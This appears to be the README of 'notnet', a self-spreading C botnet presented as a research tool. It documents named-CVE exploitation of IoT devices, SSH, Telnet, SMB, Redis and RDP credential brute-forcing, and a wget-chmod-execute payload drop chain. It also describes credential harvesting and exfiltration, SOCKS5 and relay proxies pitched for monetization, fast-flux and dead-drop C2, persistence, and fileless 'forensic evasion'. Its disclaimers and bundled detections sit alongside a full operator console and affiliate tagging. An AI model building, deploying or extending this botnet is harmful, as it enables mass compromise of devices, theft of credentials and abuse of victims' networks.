# notnet

A research-purpose botnet written in pure C. It replicates across
heterogeneous systems using known-CVE exploitation and brute-force
credential attacks.

This code is for security research only. Do not deploy it on systems you
do not own.

## Build

```sh
make                 # static x86_64 build, cleartext C2
make TLS=1           # dynamic build with OpenSSL TLS support
make build-armv7l    # cross builds
make build-aarch64
make build-riscv64
make dist-src        # source bundle for on-target compilation + pin
make clean
```

Requirements: a C compiler and pthreads. `make TLS=1` also needs OpenSSL
headers and `-lssl -lcrypto`.

Supported architectures: x86_64, ARMv7l, AArch64, RISC-V. ARMv6l, MIPS,
and PowerPC have no build targets.

## C2 Channels

| Channel | Status | Auth |
|---------|--------|------|
| HTTP | Primary | Shared secret echo (`c2_secret`) |
| WebSocket | Primary (RFC 6455) | Shared secret echo (`c2_secret`) |
| IRC | Deprecated, off by default | Nick allowlist (`irc_auth_nicks`) |

- HTTP and WS commands are rejected unless the response echoes
  `c2_secret`. No secret configured means fail-closed.
- IRC is kept for compatibility only. A bespoke channel is trivially
  sinkholed, so it provides no resilience. Re-enable with
  `irc_enabled=1`.
- All channels support TLS 1.2+ when built with `make TLS=1` and a cert
  pin (`tls_cert_pin_sha256`). The handshake, cert-pin verification
  (fail-closed on mismatch), and the TLS DATA path (heartbeats +
  commands) are verified end-to-end against a TLS C2. The default build
  is cleartext.

### Resilience

- **Fast-flux** (`flux_enabled=1`): resolves every A record of the C2
  hostname and rotates the active IP every `flux_ttl` seconds. Dead IPs
  are abandoned on the next connect or recv timeout.
- **Dead-drop resolution** (`dead_drop_url=`): fetches a C2-endpoint blob
  from a legitimate service (pastebin-style HTTP, chat, etc.) at boot and
  every `dead_drop_interval` seconds. The blob is applied only if it
  echoes `c2_secret`. A failed or unverified fetch keeps the static
  config (fail-closed). The fetch is plaintext HTTP; trust comes from the
  secret echo, not the transport.
- **C2 rotation** (`c2_backup_1`..`c2_backup_4`): after 3 consecutive
  connect failures the bot dials the next endpoint in the chain. Rotations
  are capped at 16 per process. `rotate` forces a switch manually.
  Rotation is a layer above fast-flux: flux rotates IPs within one
  hostname, rotation switches hostnames.

## Spreading

CVE exploitation runs first. Brute-force is the fallback when no CVE
module fires.

When no C2 channel is reachable (live connection state, not config
flags), the bot spreads autonomously over its configured subnet.

| Target | Method |
|--------|--------|
| IoT/edge | CVE modules (probe → verify → drop): CVE-2024-3721 TBK DVR, CVE-2017-17215 Huawei HG532, CVE-2021-35395 Realtek SDK |
| SSH | Password brute-force, payload deploy |
| Telnet | Default-credential brute-force, payload deploy |
| SMB | Login brute-force, payload deploy to ADMIN$ share |
| Redis | Unauthenticated write, authenticated brute-force, SSH key injection |
| RDP | Brute-force (auth confirmation only) |

### CVE modules

Each module runs three phases:

1. **Probe** — passive fingerprint of the service. No exploit traffic.
2. **Verify** — non-destructive proof of command execution (a unique
   token echoed back, or the service accepting an injection-shaped
   request). A payload is never dropped without a positive verify.
3. **Drop** — payload delivery over the confirmed channel (`wget` →
   `chmod` → execute).

All phases are time-bounded. No `system()` or `popen()` is used. Add a
module by appending one entry to `cve_modules[]` in `src/spread.c`.

The Redis SSH key injection vector requires a real SSH public key in
`redis_ssh_key=` (or `NOTNET_REDIS_SSH_KEY`). Placeholder keys are
rejected.

## Payload Delivery

1. **Direct download** (preferred). The binary is verified against a
   SHA-256 pin (`payload_sha256=` / `NOTNET_PAYLOAD_SHA256`). Update is
   refused without a pin or on mismatch (fail-closed). Install writes to
   the persistent path and skips the copy when the source is already that
   path.
2. **On-target compilation** (fallback, when download fails or the pin
   mismatches):
   - The bot fetches the source bundle (`payload_source_url=`, default
     `http://<server>:<port>/notnet-src.tar`).
   - The tarball must match `payload_source_sha256=` (fail-closed).
   - Extraction rejects `../` and absolute paths.
   - Compiles with the first available compiler (gcc, cc, musl-gcc,
     clang), static first, under a 120s timeout.
   - Produce the bundle with `make dist-src`.
   - Enable with `payload_compile_enabled=1`.

## Modules

### SOCKS5 proxy

The bot runs a SOCKS5 forward proxy (RFC 1928) so traffic can egress
through the bot's IP. Clients authenticate with `proxy_token` (RFC 1929).

- Refuses to bind without a token (fail-closed).
- Accept loop runs in its own thread; each connection gets a detached
  worker, capped at 32.
- IPv4 and domain destinations. IPv6 rejected.
- Control: `proxy on [port]` / `proxy off`, or `proxy_enabled=1` at boot.
- Heartbeat reports `proxy_on` and `proxy_port`.

### Credential log

Every successful brute-force credential is buffered in a bounded,
mutex-protected queue — one line per entry:
`proto|ip|port|user|pass`.

- Fixed 256×256 buffer. When full, new credentials are discarded
  (DROP-NEWEST) so unexfiltrated older ones survive.
- The unauthenticated Redis exploit records nothing (no credential).
- `exfil_creds` streams the log to the C2 in chunks, then clears the
  buffer.
- Heartbeat reports `cred_count`.

### Relay

ORB-style single-hop relay (Volt Typhoon pattern). An operator routes
traffic through a compromised device near the target.

- `relay_enabled=1` + `relay_token` (fail-closed).
- Client sends `RELAY <token> <target_host> <target_port>`; the bot
  connects to the target and splices bytes bidirectionally.
- Multi-hop chains: the request line may carry ` VIA <host>:<port>` hops
  (`RELAY <token> <target> <port> VIA <h1>:<p1> ...`); each relay forwards
  the remaining chain to the next hop's listener and the last hop connects
  to the target. Same shared fleet token authenticates every hop. Bounded
  to 8 hops. This is not a DHT.
- Same threading/buffer structure as the SOCKS5 proxy.
- `relay <target> <port> [via <host>:<port>]` probes reachability and
  RTT directly vs. through a relay bot.
- Heartbeat reports `relay_on` and `relay_port`.

### Plugins

Loader/plugin split. The core bot stays minimal; capabilities are
dispatched by name from the C2. v1 ships a fixed built-in registry:

| Plugin | Capability | `run` action |
|--------|-----------|--------------|
| `spread` | Multi-vector spreader + CVE modules | one spread cycle |
| `proxy` | SOCKS5 proxy | start listener (token-gated) |
| `relay` | ORB relay | start listener (token-gated) |
| `cred-log` | Credential harvest buffer | passive; status reports count |
| `byovd` | BYOVD defense scaffold | refuses every op (defensive only) |

Control: `plugin status`, `plugin <name> load|run|unload|status`.
`plugin_enabled=0` disables the framework.

Remote shared-object plugins: `plugin fetch <name> <url> <sha256>`
downloads a plugin `.so`, verifies its SHA-256 against the operator pin
(fail-closed, same trust model as `payload_sha256`), `dlopen()`s it, and
registers it for the normal load/run/unload dispatch. The `.so` must
export `int plugin_entry(const char *op, char *out, size_t out_sz)`
(`op` is `"load"`/`"run"`/`"unload"`; return 0 on success). Fetched
plugins are removed with `plugin drop <name>` (unload + dlclose + file
removed). Fetches require the plugin name to be a single safe token and
the URL to be `http://` (https is rejected by the download path).

### BYOVD (defense scaffold)

This repo ships **no driver-loading code**. The `byovd` plugin is a
defensive-only research scaffold: it registers but refuses every
operation with a clear log. `byovd_guard=1` makes the refusal report that
BYOVD-style abuse is blocked. See `references/byovd.md` for the research
note and a Windows defender checklist.

## Operations

- **`bot_tag`** — affiliate/operator identifier (max 64 chars), reported
  in every heartbeat so the C2 can attribute bots to affiliates.
- **`kill`** — one-way door. Wipes the credential buffer, stops
  proxy/relay/plugins, removes persistence, exits 0.
- **Global killswitch (#130)** — DNS-based author killswitch, compile-time
  only. The bot resolves the baked-in `killswitch_domain` at boot and
  every 300s; if it resolves to `127.0.0.1` (or `0.0.0.0`) the bot
  self-destructs (wipe creds, stop modules, remove persistence, exit 0)
  *before* it connects to the C2 or spreads. There is NO config key and
  NO environment variable — the operator cannot disarm a stock binary.
  Arm it by building with `-DKILLSWITCH_DOMAIN_DEFAULT="your.domain"`
  (or `docker build --build-arg KILLSWITCH_DOMAIN=your.domain`), then
  kill a leaked fleet any time by pointing that domain at `127.0.0.1`.
  Default domain is the reserved `.invalid` TLD — inert unless the
  author ships an armed build. Only a fork that recompiles the source
  can remove the check.
- **`killall` (C2)** — operator-side global kill: `c2ctl killall`
  broadcasts `kill` to every bot on every channel.

## Commands

Commands arrive over any C2 channel. The queue is rate-limited to 10
commands/second; excess commands are deferred to the next second, never
dropped.

| Command | Syntax | Status |
|---------|--------|--------|
| spread | `spread <ip>:<port>` / `spread <subnet>` | CVE-first, then brute-force fallback (22/23/445/6379/3389). Subnet form runs the threaded spreader over the range |
| scan | `scan <subnet>` / `scan <ip>[:<port,...>]` | Port scan / fingerprinting, results returned |
| exec | `exec <command>` | Strict allowlist (`uname`, `date`, `uptime`, `whoami`, `id`, `ls`, `ifconfig`, `hostname`, `netstat`, `ps`), no shell |
| download | `download <url> [path]` | Fetch URL to a local path. http:// only; https is rejected (no TLS in the default build) |
| upload | `upload <path> [remote_path]` | Upload a file to the C2 |
| exfil | `exfil <path>` | Stream a file to the C2 in chunks |
| exfil_creds | `exfil_creds` | Stream the credential log to the C2, then clear it |
| update | `update [url]` | Download + SHA-256 verify + install |
| reboot | `reboot` | Sync + reboot |
| sleep | `sleep <seconds>` | Set scan interval (1–3600) |
| config_set | `config_set <key>=<value>` | Allowlisted runtime config keys |
| proxy | `proxy on [port]` / `proxy off` | Start/stop SOCKS5 proxy (requires token) |
| relay | `relay on [port]` / `relay off` / `relay <target> <port> [via <host>:<port>]` | Start/stop relay, or probe a target's reachability/RTT |
| plugin | `plugin status` / `plugin <name> load\|run\|unload\|status` | Dispatch built-in plugins by name |
| rotate | `rotate` | Advance the C2 rotation chain manually |
| kill | `kill` | Wipe state, stop modules, remove persistence, exit 0 |
| status | — | Heartbeat: version, hostname, uptime, scan count, cred count, proxy/relay status, tag |

## Configuration

Config is loaded from `/etc/notnet.conf` (key=value).

| Key | Default | Description |
|-----|---------|-------------|
| `irc_server` | `irc.notnet.net` | IRC C2 server |
| `irc_port` | `6697` | IRC C2 port |
| `irc_channel` | `#notnet` | IRC channel |
| `irc_pass` | *(none)* | IRC password (or `NOTNET_IRC_PASS`) |
| `irc_auth_nicks` | *(none)* | Authorized operator nicks |
| `irc_enabled` | `0` | Enable deprecated IRC channel |
| `http_server` | `api.notnet.net` | HTTP C2 server |
| `http_port` | `443` | HTTP C2 port |
| `http_path` | `/api/v1/bot` | HTTP C2 path |
| `http_user_agent` | `notnet/<ver>` | HTTP User-Agent |
| `http_enabled` | auto | Explicitly enable/disable HTTP C2 |
| `ws_server` | `ws.notnet.net` | WebSocket C2 server |
| `ws_port` | `443` | WebSocket C2 port |
| `ws_path` | `/ws/v1/bot` | WebSocket C2 path |
| `ws_enabled` | auto | Explicitly enable/disable WS C2 |
| `flux_enabled` | `0` | Fast-flux C2 (rotate A records) |
| `flux_ttl` | `60` | Seconds between flux re-resolution |
| `dead_drop_url` | *(none)* | Dead-drop endpoint blob URL |
| `dead_drop_interval` | `300` | Seconds between dead-drop re-resolution |
| `proxy_enabled` | `0` | Start SOCKS5 proxy at boot (requires token) |
| `proxy_port` | `1080` | Proxy listen port |
| `proxy_token` | *(none)* | Proxy password (RFC 1929); no default (or `NOTNET_PROXY_TOKEN`) |
| `relay_enabled` | `0` | Start relay at boot (requires token) |
| `relay_port` | `1081` | Relay listen port |
| `relay_token` | *(none)* | Relay client token; no default (or `NOTNET_RELAY_TOKEN`) |
| `plugin_enabled` | `1` | Enable the plugin framework |
| `byovd_guard` | `0` | BYOVD defense posture toggle (reporting only) |
| `c2_backup_1`..`c2_backup_4` | *(none)* | Backup C2 endpoints (`host:port`, contiguous from 1) |
| `bot_tag` | *(none)* | Affiliate/operator tag (max 64 chars) |
| `c2_secret` | *(none)* | Shared secret for HTTP/WS command auth (or `NOTNET_C2_SECRET`) |
| `tls_cert_pin_sha256` | *(none)* | TLS cert pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256`) |
| `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload (or `NOTNET_PAYLOAD_SHA256`) |
| `payload_compile_enabled` | `0` | Allow on-target compilation fallback |
| `payload_source_url` | auto | Source bundle URL (or `NOTNET_PAYLOAD_SOURCE_URL`) |
| `payload_source_sha256` | *(none)* | Expected SHA-256 of source bundle (or `NOTNET_PAYLOAD_SOURCE_SHA256`) |
| `redis_ssh_key` | *(none)* | SSH key injected into Redis authorized_keys (or `NOTNET_REDIS_SSH_KEY`) |
| `scan_interval` | `30` | Seconds between scan cycles |
| `heartbeat_interval` | `60` | Seconds between heartbeats |
| `ssh_enabled` | `1` | Enable SSH spreading |
| `telnet_enabled` | `1` | Enable Telnet spreading |
| `smb_enabled` | `1` | Enable SMB spreading |
| `redis_enabled` | `1` | Enable Redis spreading |
| `rdp_enabled` | `1` | Enable RDP spreading |
| `persist_enabled` | `1` | 0 = RAM-only fileless mode (or `NOTNET_PERSIST_ENABLED`) |

### Scan targets

Default scan range is `192.168.1.0/24`. Override with `scan_targets=`:

```
scan_targets=192.168.1.0/24
scan_targets=10.0.0.0/24
```

Legacy per-index form is also accepted:

```
scan_target_0=192.168.1.0/24
scan_target_1=10.0.0.0/24
```

### Scan tuning

| Key | Default | Description |
|-----|---------|-------------|
| `scan_timeout_ms` | `500` | Connection timeout per host |
| `scan_max_hosts` | `254` | Max hosts per subnet |

Aggressive test values:

```
scan_timeout_ms=50
scan_max_hosts=5
```

## Persistence

The bot detects the init system and installs:

- systemd service
- cron job
- SysV init script

Binary paths are validated against shell metacharacters before any
installer uses them. The cron job is installed via a temp file, never
shell interpolation.

### RAM-only fileless mode (`persist_enabled=0`)

With `persist_enabled=0` the bot installs no persistence. On Linux it
relaunches itself from an anonymous `memfd_create()` file via
`fexecve()`, so no disk-backed executable exists. C2, spreading, and
payload handling work identically. The infection is lost on reboot — that
is deliberate forensic evasion. On platforms without `memfd_create`, the
bot logs and continues disk-backed with persistence skipped.

`persist_enabled` is also accepted by `config_set` (strict 0/1) and takes
effect on the next persistence install (e.g. a payload update).

## Testing

### Docker mock harness

```sh
./tests/run-tests.sh no-net       # init + loop + shutdown, no network
./tests/run-tests.sh mock-c2      # IRC + HTTP C2 against local mocks
./tests/run-tests.sh killswitch   # global killswitch: armed dies at boot, inert runs
./tests/run-tests.sh all          # all scenarios
```

The mock scenario verifies IRC/HTTP command extraction, the shared-secret
auth gate, the exec allowlist, and spread dispatch. Rebuild the Docker
image after any source change:
`docker compose -f docker-compose.test.yml build bot-mock-c2`.

### Local CI (ci-local.sh)

`./ci-local.sh` runs the same gates as the CI workflow without spending on
runners: zero-warning static build, zero-warning TLS build, TLS smoke,
sim c2-drive, and the killswitch scenario. `./ci-local.sh --full` adds the
21-check sim regressions (mock + real C2). Exit code = number of failed
gates.

### Full-network simulation (tests/sim)

`tests/sim/` runs the real compiled binary against a heterogeneous fleet
(50+ device containers: IoT, DVRs, routers, cameras, NAS, switches/APs,
Windows PCs, Redis, Cowrie honeypots) and a scriptable C2:

```sh
cd tests/sim
./run-sim.sh --scenario all --posture standard      # full run
./run-sim.sh --scenario c2-drive                    # operator-driven spread
./run-sim.sh --scenario autonomous                  # autonomous spread
./run-sim.sh --scenario remaining-parity            # IRC, SOCKS5, persistence, pinning
./run-sim.sh --scenario monetization                # proxy + relay
./run-sim.sh --scenario defence --posture hardened  # IDS/lockout/EDR + host firewall
./run-sim.sh --scenario honeytoken                   # deception: honey creds + relay tripwire (#148)
./run-sim.sh --scenario honeypot-tier                # T-Pot tier: Cowrie + Dionaea + ELK (#149)
./run-sim.sh --scenario telemetry                   # Wazuh+Sysmon+osquery fileless/LOTL (#150)
./run-sim.sh --scenario all --profile credential-hygiene  # named posture catalog (#153)
```

Coverage (see `tests/sim/PARITY-MATRIX.md`): CVE modules against legacy
devices, CVE fail-safe on patched devices, cross-vendor no-false-positive,
brute-force tier separation, payload drops and infection propagation,
IRC-only C2, real SOCKS5 proxied traffic, persistence across reboot,
payload SHA-256 pinning, fast-flux, dead-drop, C2 rotation, proxy, relay,
and the defence envelope (host firewall via DOCKER-USER, IDS, lockout,
EDR).

The driver exits non-zero on any FAIL row. `.github/workflows/sim.yml`
runs a c2-drive smoke job on every PR and the full suite nightly, so a
regressed README claim fails the build.

### Real-firmware tier (FirmAE, #124/#125/#126/#128)

Beyond the dockerized emulators, the CVE stack is exercised against REAL
vendor firmware booted full-system under QEMU (FirmAE) on the host tap
network:

```sh
# extract (host): binwalk 2.3.4 + sasquatch, DB = firmware/firmadyne
sudo env PYTHONPATH=/usr/lib/python3.14/site-packages \
  python3 sources/extractor/extractor.py -b <brand> -sql 127.0.0.1 \
  -np -nk/-nf <fw> images
# boot: scratch/<iid>/run.sh (rdinit= fix, tunctl wrapper, per-iid tap)
```

| Firmware | Endpoint | Status |
|---|---|---|
| D-Link DIR-868L | 192.168.0.1:80 | boots, real web server, web:true |
| Huawei HG532 | 192.168.0.1:37215 | boots, real TR-064 + digest auth; injection blocked by TrendChip HAL |
| TOTOLINK N300RT (2025) | 192.168.1.1:80 | boots, real Boa/0.94.14rc21 — bot CVE-2021-35395 probe HIT |
| 11× TOTOLINK 2017-2018 builds | — | formSysCmd present; boa blocked by apmib shmget (SDK flash format decoded) |

The bot's local spread scans the tap /24 and its CVE probes fire against
the live devices (observed: `CVE-2021-35395 probe hit on
192.168.1.1:80 — Server: Boa/0.94.14rc21`). Verify/drop on the live
endpoints requires a build whose handler/auth matches the module
(older Jungle SDK with unauth formSysCmd, or an HG532 HAL shim). Full
detail and repro in `tests/sim/docs/FIRMAE-LAB.md`,
`tests/sim/docs/REAL-FIRMWARE-LIVE.md`,
`tests/sim/docs/REALTEK-FIRMWARE-HUNT.md`.

## Operator console (C2 server)

`c2-server/` is the production C2 (Python, stdlib-only). It implements the
same wire contract the sim mocks define — HTTP heartbeat/command channel
(`POST /api/v1/bot`), WebSocket, legacy IRC, exfil ingest, payload
hosting — plus an SQLite state store and an operator console.

- **Channels**: HTTP, WS, IRC. The HTTP listener takes an optional TLS
  wrapper when `NOTNET_C2_TLS_CERT`/`NOTNET_C2_TLS_KEY` are set (the bot
  side is verified with the cert pin from `make TLS=1` builds).
- **Console**: HTML dashboard + JSON API on port `8090` (`/api/bots`,
  `/api/creds`, `/api/commands`, `/api/exfil`, `/api/queue`).
- **`c2ctl` CLI**: `bots`, `creds`, `commands`,
  `queue <cmd> [args...] [--target TAG]`, `killall` (broadcast `kill` to
  every bot on every channel — the operator-side global kill switch).
- **Targeting**: commands are queued per bot (optional target tag) and
  served on the next heartbeat; untargeted commands go to any bot on a
  channel; `bc-` broadcast files are peeked (never consumed) so every bot
  receives them.
- **Verified end-to-end**: the sim fleet runs against it —
  `./tests/sim/run-sim.sh --scenario all --posture standard --c2 real`
  → 21/21 parity PASS with the real binary fleet; `c2-server/smoke_test.sh`
  covers HTTP/WS/IRC delivery plus the killall broadcast (9 checks).
  `ci-local.sh` runs the same gates locally.

**Known limitation — operator exposure.** All listeners bind `0.0.0.0`
and the console API has no authentication. Anyone who can reach port
`8090` can `POST /api/queue {"cmd":"kill","broadcast":true}` and kill the
fleet, or read `/api/creds` and `/api/exfil`. Do not expose the console
(or the C2 ports) beyond your trusted network; a firewall rule or binding
the console to loopback is required for anything beyond a lab run.

See `c2-server/README.md`.

## License

MIT

## Research Notice

> This botnet is designed for research purposes. Default configuration
> uses a 30-second sleep between scans to avoid aggressive network
> behavior. It is not intended for unsanctioned deployment on third-party
> systems.

## Responsible Use & Disclosure (#154)

notnet ships **as a research instrument, not malware for deployment**. Every
offensive capability in this repo is paired, in the same repository, with the
means to detect and block it:

- **Detections** — `detections/` ships the standard triad (YARA + Sigma +
  Suricata) per offensive module, gated by CI (#151) so a rule cannot rot.
- **Threat intel** — `intel/` publishes a STIX 2.1 / TAXII feed of the C2
  domains, the killswitch domain (a sinkhole-able IOC), the CVE modules, and
  the wire-format fingerprints (#152).
- **ATT&CK matrix** — `detections/ATTACK-COVERAGE.md` maps every technique to
  its detection and a sim scenario (#147).
- **Guardrails** — the compile-time DNS killswitch (#130) makes a stock build
  inert until the author arms it; signed-disarm (#140) makes a leak
  *recoverable*. Build attestation (`make attest`, `BUILD-ATTESTATION.json`,
  #154) makes every artifact traceable to who built it.

**Do not** deploy notnet on systems you do not own or are not authorized to
test. Unsanctioned deployment is unauthorized access and is illegal in most
jurisdictions.

**Disclosure contact / policy:** see [`SECURITY.md`](SECURITY.md). Report
detection gaps and intel drift as issues — those are the highest-priority
findings because they weaken the repo's stated purpose.

**Why the guardrails live here.** A repository that visibly ships detections
(#146), IOCs (#152), and guardrails is far harder to characterize as
"operational malware" than one that ships only the bot. The defenses and the
offense are the same argument to two audiences: defenders (block this) and
platforms (this is research). Keep them in lockstep.
